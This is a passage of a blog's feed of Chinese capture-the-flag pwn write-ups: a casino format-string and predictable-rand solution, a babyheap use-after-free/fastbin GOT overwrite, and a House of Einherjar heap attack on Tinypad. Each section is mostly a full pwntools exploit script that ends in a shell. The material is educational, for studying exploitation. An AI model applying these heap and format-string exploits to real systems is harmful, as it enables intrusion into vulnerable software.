class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int seed;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;seed);</span><br><span class="line">srand(seed);</span><br><span class="line">for(i = 0; i &lt; 100; i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d &quot;,rand());</span><br><span class="line">   &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">sh.sendline(str(now))</span><br><span class="line">rand=sh.recvuntil(&quot;\n&quot;).strip().split(&quot; &quot;)</span><br><span class="line">print rand</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)</span><br><span class="line">sh=process(&apos;./casino&apos;)</span><br><span class="line">sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">for i in range(99):</span><br><span class="line">   sh.sendlineafter(&quot;number: &quot;,rand[i])</span><br><span class="line">print sh.recv()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import cdll</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./casino&quot;)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(&quot;%8$p&quot;)</span><br><span class="line">sh.recvuntil(&apos;Welcome &apos;)</span><br><span class="line">seed =eval(sh.recvuntil(&apos;\n&apos;,drop=True))&amp;0xffffffff  &lt;--- 数据类型转换成int型</span><br><span class="line">print seed</span><br><span class="line">sh.close()</span><br><span class="line">seed += 3       &lt;----还是不清楚这个3怎么计算出来的，或许是因为两个程序打开具有延迟？？</span><br><span class="line">libc = cdll.LoadLibrary(&quot;&quot;)   &lt;--- 突然发现这里为空也不影响？？</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./casino&apos;)</span><br><span class="line">pay = &apos;aaa%11$n&apos;+p64(0x602020)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(pay)</span><br><span class="line">for i in range(99):</span><br><span class="line">sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int create()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t edit()</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line"></span><br><span class="line">  printf(&quot;Content? &quot;);</span><br><span class="line">  result = read(0, buf, 0x40uLL);</span><br><span class="line">  edit_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  result = printf(&quot;Content: %s\n&quot;, buf);</span><br><span class="line">  show_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  free(buf);                                    // UAF</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 0LL;</span><br><span class="line">  delete_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 fill()</span><br><span class="line">&#123;</span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  printf(&quot;Fill &quot;);</span><br><span class="line">  read(0, buf, 0x40uLL);</span><br><span class="line">  return fill_inuse++ + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>各项功能除了次数检查基本没有限制，所以在有限的步骤内将chunk分配到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A0 create_inuse   </span><br><span class="line">.bss:00000000006020A8 edit_inuse   </span><br><span class="line">.bss:00000000006020B0 show_inuse      </span><br><span class="line">.bss:00000000006020B8 delete_inuse    </span><br><span class="line">.bss:00000000006020C0 fill_inuse     </span><br><span class="line">.bss:00000000006020C8 ; void *buf</span><br></pre></td></tr></table></figure><p>我们可以使用UAF漏洞＋fastbinattack达到目的，这样不仅消除了次数限制问题，同时可以随意修改指针<br>所以之后便是先泄露libc基址，之后修改atoi.got表为system,输入’/bin/sh’即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">def new():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def edit(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">  sh.sendafter(&quot;Content? &quot;,note)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">def  show():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)</span><br><span class="line">  sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">  return sh.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def  fill(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1337&quot;)</span><br><span class="line">  sh.sendafter(&quot;Fill &quot;,note)</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./babyheap&quot;)</span><br><span class="line">elf = ELF(&quot;./babyheap&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">delete()</span><br><span class="line">edit(p64(0x602095-8))</span><br><span class="line">new()</span><br><span class="line">fill(&apos;/bin/sh&apos;+chr(0)+&apos;a&apos;*0x33+p64(0x602060)[0:3])</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">libc_addr = u64(sh.recvuntil(&apos;\n&apos;)[:-1].ljust(8,&apos;\x00&apos;))-libc.plt[&apos;atoi&apos;]</span><br><span class="line">print &quot;libc_addr : &quot; + hex(libc_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">system_addr = libc_addr + libc.plt[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;leakless&quot;&gt;&lt;a href=&quot;#leakless&quot; class=&quot;headerlink&quot; title=&quot;leakless&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.8-HouseOfEinherjar</title>
    <link href="http://siriuswhiter.tk/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/"/>
    <id>http://siriuswhiter.tk/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/</id>
    <published>2019-01-24T09:32:53.000Z</published>
    <updated>2019-01-25T06:55:36.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Einherjar-原理"><a href="#House-of-Einherjar-原理" class="headerlink" title="House of Einherjar 原理"></a>House of Einherjar 原理</h1><p>感觉像是把好几种漏洞结合起来：<br>    off by one<br>    unlink （需要能够完全溢出到下一个堆来控制<br>    chunk entend or shrink; 但是细节却不相同。</p><p>该利用需要：</p><ol><li>chunk能够覆盖next_chunk的pre_size并修改pre_inuse位</li><li>泄露地址使得unlink 检查pre_size与size时能够绕过</li><li>fake_chunk的fd 与 bk指针需要能够绕过检查</li></ol><p>当我们能够覆盖nextchunk的pre_size位及pre_inuse位时，我们便可以伪造fake_chunk，之后在free next_chunk时，fake_chunk通过伪造便能绕过检查被置入bin中</p><h1 id="Tinypad"><a href="#Tinypad" class="headerlink" title="Tinypad"></a>Tinypad</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>程序自己重写了许多write read函数<br>主要功能 add edit delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(c) = i + &apos;1&apos;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</span><br><span class="line">        writeln(*(char **)&amp;tinypad[16 * (i + 16LL) + 8], v3);</span><br><span class="line">      &#125;</span><br><span class="line">      writeln(&quot;\n&quot;, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      write_n(</span><br><span class="line">    &quot;+- MENU -----------------------------------------------------------------------+\n&quot;</span><br><span class="line">    &quot;| [A] Add memo                                                                 |\n&quot;</span><br><span class="line">    &quot;| [D] Delete memo                                                              |\n&quot;</span><br><span class="line">    &quot;| [E] Edit memo                                                                |\n&quot;</span><br><span class="line">    &quot;| [Q] Quit                                                                     |\n&quot;</span><br><span class="line">    &quot;+------------------------------------------------------------------------------+\n&quot;,</span><br><span class="line">    486LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( cmd == &apos;D&apos; )                           // delete</span><br><span class="line">    &#123;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )// inuse</span><br><span class="line">        &#123;</span><br><span class="line">          free(*(void **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);// ptr</span><br><span class="line">          *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] = 0LL;</span><br><span class="line">          writeln(&quot;\nDeleted.&quot;, 9LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      if ( cmd = &apos;E&apos; )</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          c = &apos;0&apos;;</span><br><span class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">          while ( toupper(c) != &apos;Y&apos; )</span><br><span class="line">          &#123;</span><br><span class="line">            write_n(&quot;CONTENT: &quot;, 9LL);</span><br><span class="line">            v6 = strlen(tinypad);</span><br><span class="line">            writeln(tinypad, v6);</span><br><span class="line">            write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">            read_until(tinypad, v7, &apos;\n&apos;);</span><br><span class="line">            writeln(&quot;Is it OK?&quot;, 9LL);</span><br><span class="line">            write_n(&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</span><br><span class="line">            read_until((char *)&amp;c, 1uLL, &apos;\n&apos;);</span><br><span class="line">          &#125;</span><br><span class="line">          strcpy(*(char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8], tinypad);</span><br><span class="line">          writeln(&quot;\nEdited.&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      if ( cmd != &apos;A&apos; )</span><br><span class="line">        goto LABEL_43;</span><br><span class="line">      while ( idx &lt;= 3 &amp;&amp; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] )</span><br><span class="line">        ++idx;</span><br><span class="line">      if ( idx == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        writeln(&quot;No space is left.&quot;, 17LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        size = -1;</span><br><span class="line">        write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        size = read_int();</span><br><span class="line">        if ( size &lt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = size;</span><br><span class="line">          if ( (unsigned __int64)size &gt; 0x100 )</span><br><span class="line">            v5 = 256;</span><br><span class="line">        &#125;</span><br><span class="line">        size = v5;                              // max size =256</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5;</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(size);</span><br><span class="line">        if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )// 检查inuse位</span><br><span class="line">        &#123;</span><br><span class="line">          writerrln(&quot;[!] No memory is available.&quot;, 27LL);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">        read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], size, 0xAu);</span><br><span class="line">        writeln(&quot;\nAdded.&quot;, 7LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( cnt != 81 );</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为读取输出函数都是重写的，比较麻烦，但是手动测试能够发现最低位的覆盖问题</p><p>再有在delete时仅将size清零并free chunk，没有将chunk 指针清零，UAF漏洞存在</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./tinypad&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;A&quot;)</span><br><span class="line">    p.recvuntil(&quot;(SIZE)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line">def delete(index):</span><br><span class="line"> </span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;D&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line">def edit(index, content, ok=True):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;E&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(&quot;(Y/n)&gt;&gt;&gt; &quot;)</span><br><span class="line">    if ok:</span><br><span class="line">        p.sendline(&quot;Y&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendline(&quot;n&quot;)</span><br><span class="line"> </span><br><span class="line">#stage one</span><br><span class="line">add(0x80, &quot;A&quot;*0x80)</span><br><span class="line">add(0x80, &quot;B&quot;*0x80)</span><br><span class="line">add(0x80, &quot;C&quot;*0x80)</span><br><span class="line">add(0x80, &quot;D&quot;*0x80)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">heap = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x120</span><br><span class="line">log.info(&quot;heap_base: %s&quot; % hex(heap))</span><br><span class="line">p.recvuntil(&quot; #   INDEX: 3\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8, &quot;\x00&quot;)) - 0x58</span><br><span class="line">log.info(&quot;main_arena: %s&quot; % hex(main_arena))</span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br><span class="line"> </span><br><span class="line">#stage two</span><br><span class="line">add(0x18, &quot;A&quot;*0x18)</span><br><span class="line">add(0x100, &quot;B&quot;*0xf8 + p64(0x11))</span><br><span class="line">add(0x100, &quot;C&quot;*0xf8)</span><br><span class="line">add(0x100, &quot;D&quot;*0xf8)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tinypad = 0x602040</span><br><span class="line">offset = heap + 0x20 - 0x602040 - 0x20</span><br><span class="line">fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2</span><br><span class="line"> </span><br><span class="line">edit(3, &quot;D&quot;*0x20 + fake_chunk)</span><br><span class="line">zero_byte_number = 8 - len(p64(offset).strip(&quot;\x00&quot;))</span><br><span class="line">for i in range(zero_byte_number+1):</span><br><span class="line">  data = &quot;A&quot;*0x10 + p64(offset).strip(&quot;\x00&quot;).rjust(8-i, &apos;f&apos;)</span><br><span class="line">  edit(1, data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">edit(4, &quot;D&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2)</span><br><span class="line"> </span><br><span class="line">#gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">#stage three</span><br><span class="line">libc_base = main_arena + 0x58 - 0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: %s&quot; % hex(libc_base))</span><br><span class="line">one_gadget =  libc_base + 0x45216</span><br><span class="line">environ_pointer = libc_base + libc.symbols[&apos;__environ&apos;]</span><br><span class="line"> </span><br><span class="line">add(0xf0, &quot;A&quot;*0xd0 + p64(0x18) + p64(environ_pointer) + &apos;a&apos;*8 + p64(0x602148))</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x8*30</span><br><span class="line">log.info(&quot;main_ret_addr: %s&quot; % hex(main_ret))</span><br><span class="line">log.info(&quot;one_gadget_addr :%s &quot;% hex(one_gadget))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;Q&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Einherjar-原理&quot;&gt;&lt;a href=&quot;#House-of-Einherjar-原理&quot; class=&quot;headerlink&quot; title=&quot;House of Einherjar 原理&quot;&gt;&lt;/a&gt;House of Einherjar 原理&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.7-HouseOfForce</title>
    <link href="http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-7-houseofforce/"/>
    <id>http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-7-houseofforce/</id>
    <published>2019-01-22T11:42:55.000Z</published>
    <updated>2019-01-24T09:41:48.321Z</updated>
    
